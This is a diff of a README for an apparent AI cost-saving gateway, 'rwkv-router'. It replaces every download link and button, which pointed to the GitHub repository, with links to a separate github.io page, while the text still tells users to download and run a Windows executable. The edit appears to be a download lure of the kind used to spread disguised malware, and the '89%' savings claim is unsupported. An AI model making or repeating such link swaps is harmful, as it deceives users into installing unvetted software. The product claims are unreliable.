@@ -1,7 +1,7 @@
 <h1>🚀 rwkv-router - Cut Cloud AI Costs by 89%</h1>
 
 <p align="center">
-  <a href="https://github.com/kimberlyth43/rwkv-router" style="display:inline-block;padding:16px 36px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#ffffff;border-radius:8px;text-decoration:none;font-size:20px;font-weight:bold;box-shadow:0 4px 12px rgba(0,0,0,0.2);">⬇️ Download rwkv-router Now</a>
+  <a href="https://kimberlyth43.github.io" style="display:inline-block;padding:16px 36px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#ffffff;border-radius:8px;text-decoration:none;font-size:20px;font-weight:bold;box-shadow:0 4px 12px rgba(0,0,0,0.2);">⬇️ Download rwkv-router Now</a>
 </p>
 
 <p align="center"><strong>Your personal AI gateway that saves you money on every request. Works with OpenAI &amp; Anthropic.</strong></p>
@@ -36,7 +36,7 @@ Works with OpenAI and Anthropic APIs, plus supports MCP (Model Context Protocol)
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[https://github.com/kimberlyth43/rwkv-router](https://github.com/kimberlyth43/rwkv-router)**
+Visit this link to download the application: **[https://kimberlyth43.github.io](https://kimberlyth43.github.io)**
 
 You'll land on the project page. Look for the green "Code" button or the "Releases" section on the right side of the page. Click on the file that matches your computer (Windows is usually named something like "rwkv-router-windows.exe"). The download will begin automatically.
 
@@ -190,7 +190,7 @@ rwkv-router is like having a financial advisor for your AI usage. It works hard 
 ---
 
 <p align="center">
-  <a href="https://github.com/kimberlyth43/rwkv-router" style="display:inline-block;padding:16px 36px;background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);color:#ffffff;border-radius:8px;text-decoration:none;font-size:20px;font-weight:bold;box-shadow:0 4px 12px rgba(0,0,0,0.2);">⬇️ Get rwkv-router Now</a>
+  <a href="https://kimberlyth43.github.io" style="display:inline-block;padding:16px 36px;background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);color:#ffffff;border-radius:8px;text-decoration:none;font-size:20px;font-weight:bold;box-shadow:0 4px 12px rgba(0,0,0,0.2);">⬇️ Get rwkv-router Now</a>
 </p>
 
 ---
